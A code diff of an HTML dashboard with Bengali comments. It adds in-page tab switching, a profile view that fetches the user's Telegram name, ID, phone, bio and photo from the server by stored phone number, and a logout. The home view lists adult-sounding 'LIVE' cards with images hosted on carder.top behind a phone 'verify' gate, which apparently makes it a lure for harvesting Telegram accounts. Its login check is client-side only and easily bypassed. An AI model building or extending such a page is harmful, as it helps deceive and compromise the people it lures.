@@ -8,7 +8,6 @@
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Poppins', sans-serif; }
         
-        /* পেজ সিকিউরিটি গার্ড: লগইন চেক না হওয়া পর্যন্ত পেজটি লুকিয়ে রাখবে যাতে ফ্লিকার না করে */
         #dashboardWrapper {
             opacity: 0;
             transition: opacity 0.4s ease;
@@ -37,7 +36,7 @@
             object-fit: cover; z-index: -1; filter: brightness(0.4);
         }
 
-        /* হেডার ন্যাভবার (ডানে রিফ্রেশ বাটন) */
+        /* হেডার ন্যাভবার */
         .header-nav {
             width: 100%;
             max-width: 440px;
@@ -108,16 +107,21 @@
             100% { transform: rotate(360deg); }
         }
 
-        /* প্রোফাইল লিস্ট কন্টেইনার */
-        .profile-container {
+        /* ভিউ সেকশন কন্ট্রোল (ট্যাব সুইচ করার জন্য) */
+        .view-section {
             width: 100%;
             max-width: 440px;
-            display: flex;
+            display: none;
             flex-direction: column;
             gap: 15px;
             z-index: 2;
         }
 
+        .view-section.active-view {
+            display: flex;
+        }
+
+        /* লিডারবোর্ড কার্ড স্টাইল */
         .profile-card {
             background: rgba(20, 25, 45, 0.75);
             backdrop-filter: blur(20px);
@@ -172,6 +176,117 @@
             font-weight: 500;
         }
 
+        /* --- প্রোফাইল পেজের স্টাইল (ড্যাশবোর্ডের ভেতরে দেখানোর জন্য) --- */
+        .profile-card-modern {
+            width: 100%;
+            background: rgba(26, 31, 46, 0.85);
+            backdrop-filter: blur(25px);
+            -webkit-backdrop-filter: blur(25px);
+            border: 1px solid rgba(255, 255, 255, 0.12);
+            border-radius: 28px;
+            padding: 16px 16px 24px 16px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.6);
+            display: flex;
+            flex-direction: column;
+            position: relative;
+            color: #ffffff;
+        }
+
+        .card-image-wrapper {
+            width: 100%;
+            height: 280px;
+            border-radius: 20px;
+            overflow: hidden;
+            position: relative;
+            box-shadow: 0 10px 20px rgba(0,0,0,0.4);
+            background: rgba(255, 255, 255, 0.05);
+        }
+
+        .card-image-wrapper img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+
+        .card-user-info {
+            padding: 16px 6px 4px 6px;
+        }
+
+        .name-row h2 {
+            font-size: 18px;
+            font-weight: 700;
+            color: #ffffff;
+            word-break: break-word;
+        }
+
+        .username-text {
+            font-size: 13px;
+            color: #00bfff;
+            margin-bottom: 12px;
+            font-weight: 500;
+        }
+
+        .card-bio {
+            font-size: 13px;
+            color: #cbd5e1;
+            line-height: 1.5;
+            margin-bottom: 15px;
+            background: rgba(255, 255, 255, 0.04);
+            padding: 10px 12px;
+            border-radius: 12px;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            word-break: break-word;
+        }
+
+        .telegram-meta-details {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            border-top: 1px solid rgba(255, 255, 255, 0.08);
+            padding-top: 12px;
+            margin-top: 5px;
+        }
+
+        .meta-row {
+            display: flex;
+            flex-direction: column;
+            gap: 2px;
+        }
+
+        .meta-label {
+            font-size: 11px;
+            color: #94a3b8;
+            font-weight: 500;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .meta-value {
+            font-size: 13px;
+            color: #ffffff;
+            font-weight: 600;
+            word-break: break-all;
+        }
+
+        .logout-box {
+            width: 100%;
+            margin-top: 15px;
+        }
+
+        .logout-action-btn {
+            width: 100%;
+            background: rgba(255, 77, 77, 0.15);
+            color: #ff4d4d;
+            border: 1px solid rgba(255, 77, 77, 0.3);
+            padding: 12px;
+            border-radius: 16px;
+            font-weight: 700;
+            font-size: 13px;
+            cursor: pointer;
+        }
+
         /* --- প্রিমিয়াম লাইভ ব্যাজ স্টাইল --- */
         .live-badge-container {
             display: inline-flex;
@@ -196,18 +311,9 @@
         }
 
         @keyframes livePulse {
-            0% {
-                transform: scale(1);
-                box-shadow: 0 0 0 0 rgba(255, 26, 26, 0.7);
-            }
-            70% {
-                transform: scale(1.18);
-                box-shadow: 0 0 0 8px rgba(255, 26, 26, 0);
-            }
-            100% {
-                transform: scale(1);
-                box-shadow: 0 0 0 0 rgba(255, 26, 26, 0);
-            }
+            0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255, 26, 26, 0.7); }
+            70% { transform: scale(1.18); box-shadow: 0 0 0 8px rgba(255, 26, 26, 0); }
+            100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255, 26, 26, 0); }
         }
 
         .live-text {
@@ -224,16 +330,8 @@
         .live-text::after {
             content: '';
             position: absolute;
-            top: -50%;
-            left: -150%;
-            width: 50%;
-            height: 200%;
-            background: linear-gradient(
-                to right,
-                rgba(255, 255, 255, 0) 0%,
-                rgba(255, 255, 255, 0.3) 50%,
-                rgba(255, 255, 255, 0) 100%
-            );
+            top: -50%; left: -150%; width: 50%; height: 200%;
+            background: linear-gradient(to right, rgba(255,255,255,0) 0%, rgba(255,255,255,0.3) 50%, rgba(255,255,255,0) 100%);
             transform: rotate(30deg);
             animation: shimmerSweep 3s ease-in-out infinite;
         }
@@ -331,7 +429,6 @@
     </style>
 
     <script>
-        // সিকিউরিটি গার্ড চেক
         if (localStorage.getItem("isLoggedIn") !== "true") {
             window.location.replace("verify.html");
         } else {
@@ -340,7 +437,55 @@
                 setTimeout(() => {
                     document.getElementById('bottomNav').classList.add('slide-up');
                 }, 100);
+
+                // প্রোফাইল পেজের ডাটা অটো ফেচ করার ফাংশন কল
+                fetchTelegramProfile();
             });
+        }
+
+        // ট্যাব সুইচিং ফাংশন (কোনো পেজ রিলোড ছাড়াই ইনস্ট্যান্ট কাজ করবে)
+        function switchView(viewName, element) {
+            document.querySelectorAll('.view-section').forEach(sec => sec.classList.remove('active-view'));
+            document.querySelectorAll('.nav-item').forEach(nav => nav.classList.remove('active'));
+
+            if (viewName === 'home') {
+                document.getElementById('homeView').classList.add('active-view');
+            } else if (viewName === 'profile') {
+                document.getElementById('profileView').classList.add('active-view');
+            }
+            element.classList.add('active');
+        }
+
+        // টেলিগ্রাম প্রোফাইল ডাটা ফেচ করা
+        function fetchTelegramProfile() {
+            let userPhone = localStorage.getItem("userPhone");
+            if (userPhone) {
+                fetch('/get-user-profile', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ phone: userPhone })
+                })
+                .then(res => res.json())
+                .then(data => {
+                    if (data.status === "success") {
+                        let p = data.profile;
+                        document.getElementById('profileName').innerText = p.name;
+                        document.getElementById('profileUsername').innerText = p.username;
+                        document.getElementById('profileId').innerText = p.id;
+                        document.getElementById('profilePhone').innerText = p.phone;
+                        document.getElementById('profileBio').innerText = p.bio;
+                        
+                        if (p.photo) {
+                            let imgElement = document.getElementById('profileImage');
+                            imgElement.src = p.photo;
+                            imgElement.onload = () => {
+                                imgElement.style.opacity = "1";
+                            };
+                        }
+                    }
+                })
+                .catch(err => console.log("Profile fetch error"));
+            }
         }
     </script>
 </head>
@@ -353,13 +498,12 @@
 
     <div id="dashboardWrapper">
         <!-- হেডার ন্যাভবার -->
-        .  <div class="header-nav">
+        <div class="header-nav">
             <button id="refreshBtn" onclick="triggerRefresh(this)" class="header-btn refresh-btn">REFRESH</button>
         </div>
 
-        <!-- প্রোফাইল কার্ড লিস্ট -->
-        <div class="profile-container">
-            
+        <!-- ১. হোম / লিডারবোর্ড ভিউ (ডিফল্ট ওপেন থাকবে) -->
+        <div id="homeView" class="view-section active-view">
             <div class="profile-card active-glow" onclick="openProfile('⛔Naughty NonStop🚫', 'Open Media')">
                 <div class="user-info-wrapper">
                     <img src="https://carder.top/imagens/1792065172414-739661966.jpg" alt="Avatar" class="avatar">
@@ -429,7 +573,41 @@
                     <span class="live-text">LIVE</span>
                 </div>
             </div>
+        </div>
 
+        <!-- ২. প্রোফাইল ভিউ (প্রোফাইল আইকনে ক্লিক করলে এই সেকশন শো করবে) -->
+        <div id="profileView" class="view-section">
+            <div class="profile-card-modern">
+                <div class="card-image-wrapper">
+                    <img id="profileImage" src="" alt="Profile Picture">
+                </div>
+
+                <div class="card-user-info">
+                    <div class="name-row">
+                        <h2 id="profileName">Loading...</h2>
+                    </div>
+                    <div id="profileUsername" class="username-text">@username</div>
+
+                    <div id="profileBio" class="card-bio">
+                        Loading bio...
+                    </div>
+
+                    <div class="telegram-meta-details">
+                        <div class="meta-row">
+                            <span class="meta-label">Phone Number</span>
+                            <span id="profilePhone" class="meta-value">+880 XXXXXXXXXX</span>
+                        </div>
+                        <div class="meta-row">
+                            <span class="meta-label">Telegram ID</span>
+                            <span id="profileId" class="meta-value">000000000</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="logout-box">
+                <button onclick="logoutUser()" class="logout-action-btn">Log Out Account 🚪</button>
+            </div>
         </div>
 
         <!-- নিচে গ্লাস-মরফিজম বটম ন্যাভবার -->
@@ -442,18 +620,18 @@
             </button>
 
             <!-- মাঝে: হোম বাটন -->
-            <a href="dashboard.html" class="nav-item active" title="Home">
+            <button onclick="switchView('home', this)" class="nav-item active" title="Home">
                 <svg viewBox="0 0 24 24">
                     <path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/>
                 </svg>
-            </a>
+            </button>
 
-            <!-- ডান পাশে: প্রোফাইল পেজে যাওয়ার সঠিক লিংক -->
-            <a href="profile.html" class="nav-item" title="Profile">
+            <!-- ডান পাশে: প্রোফাইল বাটন (একই পেজে সুইচ করবে) -->
+            <button onclick="switchView('profile', this)" class="nav-item" title="Profile">
                 <svg viewBox="0 0 24 24">
                     <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/>
                 </svg>
-            </a>
+            </button>
         </div>
 
         <!-- মোডাল পপআপ -->
@@ -488,6 +666,12 @@
 
         function closeModal() {
             document.getElementById('profileModal').style.display = 'none';
+        }
+
+        function logoutUser() {
+            localStorage.removeItem("isLoggedIn");
+            localStorage.removeItem("userPhone");
+            window.location.href = "verify";
         }
     </script>
 </body>
